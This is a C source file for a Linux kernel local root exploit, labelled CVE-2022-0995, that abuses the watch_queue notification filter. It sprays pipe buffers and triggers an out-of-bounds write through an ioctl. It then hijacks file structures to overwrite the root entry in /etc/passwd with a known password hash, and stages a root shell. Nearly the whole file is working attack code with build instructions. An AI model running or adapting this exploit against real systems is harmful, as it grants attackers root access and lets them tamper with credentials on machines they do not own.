// gcc exploit.c -o exploit -no-pie -static -masm=intel
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/watch_queue.h>
#include <sys/syscall.h>
#include <sys/resource.h>
// #include<fcntl.h>

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE    0x41
#define SECONDARY_MSG_TYPE  0x42
#define VICTIM_MSG_TYPE     0x1337
#define MSG_TAG     0xAAAAAAAA

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 0x790
#define FILE_NUM 0x100

#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");

void leak(size_t *content,size_t size)
{
    printf("[*]Leak: ");
    for(int i=0;i<(int)(size/8);i++)
    {
       printf("%llx\n",content[i]);
    }
}

struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg
{
    uint64_t    next;
};

struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

// sizeof(struct skb_shared_info) = 0x140     1024-0x140 = 704
char fake_secondary_msg[704];

struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

void errExit(char *msg)
{
    printf("[-] Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

static void adjust_rlimit()
{
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = (1L << 63);
    setrlimit(RLIMIT_AS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 32 << 20;
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 136 << 20;
    setrlimit(RLIMIT_FSIZE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 1 << 20;
    setrlimit(RLIMIT_STACK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0x8000;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
    {
        rlim.rlim_cur = rlim.rlim_max = 4096;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0)
        {
            errExit("setrlimit(RLIMIT_NOFILE, &rlim): %m");
        }
    }

    struct rlimit print_limit;
    getrlimit(RLIMIT_NOFILE, &print_limit);
    printf("[RLIMIT_NOFILE] soft limit= 0x%lx \t"
         " hard limit= 0x%lx\n",
         (long)print_limit.rlim_cur,
         (long)print_limit.rlim_max);
    getrlimit(RLIMIT_AS, &print_limit);
    printf("[RLIMIT_AS] soft limit= 0x%lx \t"
         " hard limit= 0x%lx\n",
         (long)print_limit.rlim_cur,
         (long)print_limit.rlim_max);
}


void get_shell(void)
{
    if (getuid())
        errExit("failed to gain the root!");
    printf("[+] Success! Pop root shell now...\n");
    syscall(SYS_execve, "/bin/sh", 0, 0);
}

void oob_write(int pipe_fd[2])
{
    struct watch_notification_filter *wfilter;
    unsigned int nfilters;
    
    nfilters = 4;
    wfilter = (struct watch_notification_filter*)
            calloc(1, sizeof(struct watch_notification_filter)
                + nfilters * sizeof(struct watch_notification_type_filter));
    wfilter->nr_filters = nfilters;

    // normal filter
    for (int i = 0; i < (nfilters - 1); i++)
        wfilter->filters[i].type = 1;
    
    // evil filter
    // 0x300 = 8 * 96 bytes
    // 1 << 0xa = 0x400, maybe we can hit a proper bit
    wfilter->filters[nfilters - 1].type = 0x306;

    // triger oob write
    if (ioctl(pipe_fd[0], IOC_WATCH_QUEUE_SET_FILTER, wfilter) < 0)
        errExit("failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!");
    
    // prevent memory leak in userspace(no need in fact)
    free(wfilter);
}



int         pipe_fd[PIPE_NUM][2];
size_t      find_pipe[PIPE_NUM][0x2];
int         oob_pipe_fd[2];
size_t      pipe_data[0x200];
int         sk_sockets[SOCKET_NUM][2];
    
int         tmp_fd[2];
int         victim_qid, real_qid;
struct msg_msg  *nearby_msg;
struct msg_msg  *nearby_msg_prim;
struct pipe_buffer *pipe_buf_ptr;
struct pipe_buf_operations *ops_ptr;
uint64_t    victim_addr;
uint64_t    kernel_base;
uint64_t    kernel_offset;
uint64_t    *rop_chain;
int         rop_idx;
cpu_set_t   cpu_set;
long			page_size;
size_t			offset_in_file;
size_t 			data_size;
int 			target_file_fd;
int             writable_file_fd;
struct stat 	target_file_stat;
	// int				pipe_fd[2];
int 			pipe_size;
char 			*buffer;
int 			retval;
size_t pipe_magic_num[0x2];
int same_pipe[2];
int file_fd[FILE_NUM];

int main(int argc, char **argv, char **envp)
{
    

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    adjust_rlimit();

    // if (fstat(target_file_fd, &target_file_stat))
		// errExit("Failed to get the info of the target file!");
    page_size = sysconf(_SC_PAGE_SIZE);
    

    // pipe to trigert off-by-null
    if (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) < 0)
        errExit("failed to create O_NOTIFICATION_PIPE!");
    
    RED puts("[*] CVE-2022-0995 by Lotus"); CLOSE
    puts("[*] spray pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
        {
            printf("failed to create pipe:%d!\n",i);
            return -1;
        }
    }

    puts("[+] edit the pipe_buffer size to 0x60");
    for(int i=0;i<PIPE_NUM;i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 2) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_NUM; i++) {
        size_t magic_num = 0xdead0000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "Lotus777", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "Lotus777", 8);
        write(pipe_fd[i][1], "Lotus777", 8);  /* prevent pipe_release() */
    }

    

    // getchar();
    puts("[*] Create 2 holes in pipe_buffer...");

    for (int i = 21; i < PIPE_NUM; i += (42))
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    puts("[+] Trigger OOB");
    
    oob_write(oob_pipe_fd);
    // for(int i=0;i<PIPE_NUM;i++)
    // {
    //     if (i != same_pipe[1] || i != same_pipe[0] || i%(500/4)!=0)
    //     {
    //         if (write(pipe_fd[i][1],"Lotus___", 8) < 0)
    //         errExit("failed to write the pipe!");
    //     }
        
    // } 
    // oob_write(oob_pipe_fd);

    
 

    for (int i = 21; i < PIPE_NUM; i++)
    {
        if(((i-21)%(42))!=0)//can't equal to the hole
        {
            read(pipe_fd[i][0],find_pipe[i],0x10);
        }
        
    }
    int is_found = 0;
    puts("[*] finding...");
    for (int i = 0; i < PIPE_NUM&&!is_found; i++)
    {
        if((i-21)%(42)!=0)//can't equal to the hole
        {
	    //printf("now %d\n",i);
            if(find_pipe[i][0]!=0xdead0000+i&&!strncmp(&find_pipe[i][1],"Lotus777",8))
            {
                same_pipe[0]=find_pipe[i][0]-0xdead0000;
                same_pipe[1]=i;//previous
                // if(same_pipe[0]>PIPE_NUM||same_pipe[0]-same_pipe[1]==1||same_pipe[1]-same_pipe[0]==1)
                if(same_pipe[0]>PIPE_NUM)
                {
                    RED puts("[*]pipe idx out of range."); CLOSE
                    return -1;
                }
                BLUE printf("found pipe coincide at idx:%d and %d\n",same_pipe[0],same_pipe[1]); CLOSE
                is_found=1;
            }   
        }
        
    }
    // puts("[*]finding down...");
    if(!is_found)
    {
        RED puts("[*]Not hit."); CLOSE
        return -1;
    }

    size_t buf[0x1000];
    int SND_PIPE_BUF_SZ = 96*2;
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);

    memset(buf, '\0', sizeof(buf));

    /*write something to alarge the pipe_read size after*/
    // write(pipe_fd[same_pipe[1]][1], buf,0x500);
    write(pipe_fd[same_pipe[1]][1], buf, SND_PIPE_BUF_SZ*2 - 24 - 3*sizeof(int)+0x18+0x28+0x84 - 0x30);


    puts("[*] uaf one of the pipe_buffer->page");
    // getchar();
    close(pipe_fd[same_pipe[0]][0]);
    close(pipe_fd[same_pipe[0]][1]);

    // puts("[*]press enter to put the pwd file page cache into the uaf page");
    puts("[*] Spray pwd file struct...");
    
    for (int i = 0; i < FILE_NUM; i++) 
    {

        file_fd[i] = open("/etc/passwd", 0);
        if (file_fd[i] < 0) 
        {
            errExit("FAILED to open pwd file!");
        }
    }

    size_t tmp = 0x480e801f;
    puts("[*] Edit pwd file->f_mode...");
    if(write(pipe_fd[same_pipe[1]][1], &tmp, 4) < 0)
    {
        errExit("failed to write the pipe!");
    }
   

    
   

    char *data = "root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
    printf("Setting root password to \"Lotus\"...\n");
    int data_size = strlen(data);

    puts("[*] finally: edit the pwd file");
    //what we want to edit pipe->page
    for (int i = 0;i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data,data_size);
            if (retval > 0)
            {
               RED printf("Write Success:%d!\n",i); CLOSE
            }

        }
    //for (int i = 0;i < FILE_NUM; i++) 
        //{   
            //close(file_fd[i]);
        //}    
    puts("[*] Now the password is:");
    system("head -n 1 /etc/passwd");
    puts("");
    char *argvv[] = {"/bin/sh", "-c", "(echo Lotus; cat) | su - -c \""
                        "echo \\\"\033[31mDone! Popping shell... (run commands now)\\\";"
                        // "cp /tmp/passwd /etc/passwd;"
                        "/bin/sh;"
                    "\" root",NULL};
    //execv("/bin/sh", argvv);


}
